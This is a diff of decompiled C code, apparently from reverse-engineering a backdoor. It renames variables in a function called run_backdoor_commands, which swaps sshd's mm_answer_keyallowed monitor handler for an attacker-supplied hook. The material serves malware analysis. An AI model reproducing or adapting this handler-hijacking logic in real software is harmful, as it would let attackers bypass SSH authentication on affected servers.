@@ -29,7 +29,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   pfn_setlogmask_t setlogmask_fn;
   sshd_ctx_t *sshd_ctx;
   uint *use_pam_ptr;
-  long *mm_answer_slot;
+  sshd_monitor_func_t *keyallowed_slot;
   pfn_exit_t exit_fn;
   byte bVar13;
   uint uVar14;
@@ -311,7 +311,8 @@ LAB_00109c8a:
                                       if (uVar27 == 0) {
                                         sshd_ctx = ctx->sshd_ctx;
                                         if (((sshd_ctx != (sshd_ctx_t *)0x0) &&
-                                            (sshd_ctx->mm_answer_keyallowed_ptr != (void *)0x0)) &&
+                                            (sshd_ctx->mm_answer_keyallowed_slot !=
+                                             (sshd_monitor_func_t *)0x0)) &&
                                            (sshd_ctx->have_mm_answer_keyallowed != FALSE)) {
                                           if ((char)local_2e0[1] < '\0') goto LAB_00109d36;
                                           piVar21 = sshd_ctx->permit_root_login_ptr;
@@ -399,21 +400,24 @@ LAB_00109d36:
                                                                             ),libc);
                                                     if (-1 < sVar22) {
                                                       sshd_ctx = ctx->sshd_ctx;
-                                                      if (sshd_ctx->mm_answer_keyallowed !=
-                                                          (void *)0x0) {
-                                                        mm_answer_slot = (long *)sshd_ctx->
-                                                  mm_answer_keyallowed_ptr;
-                                                  if ((local_2e0[2] & 0x3f) == 0) {
-                                                    iVar15 = 0x16;
-                                                    if (mm_answer_slot != (long *)0x0) {
-                                                      iVar15 = (int)mm_answer_slot[-1];
-                                                    }
-                                                  }
-                                                  else {
-                                                    iVar15 = (uint)(local_2e0[2] & 0x3f) * 2;
-                                                  }
-                                                  sshd_ctx->mm_answer_keyallowed_reqtype = iVar15 + 1;
-                                                  *mm_answer_slot = (long)sshd_ctx->mm_answer_keyallowed;
+                                                      if (sshd_ctx->mm_answer_keyallowed_hook !=
+                                                          (sshd_monitor_func_t)0x0) {
+                                                        keyallowed_slot = sshd_ctx->mm_answer_keyallowed_slot
+                                                        ;
+                                                        if ((local_2e0[2] & 0x3f) == 0) {
+                                                          iVar15 = 0x16;
+                                                          if (keyallowed_slot != (sshd_monitor_func_t *)0x0
+                                                             ) {
+                                                            iVar15 = *(int *)(keyallowed_slot + -1);
+                                                          }
+                                                        }
+                                                        else {
+                                                          iVar15 = (uint)(local_2e0[2] & 0x3f) * 2;
+                                                        }
+                                                        sshd_ctx->mm_answer_keyallowed_reqtype =
+                                                             iVar15 + 1;
+                                                        *keyallowed_slot = sshd_ctx->
+                                                  mm_answer_keyallowed_hook;
                                                   goto LAB_0010a076;
                                                   }
                                                   }
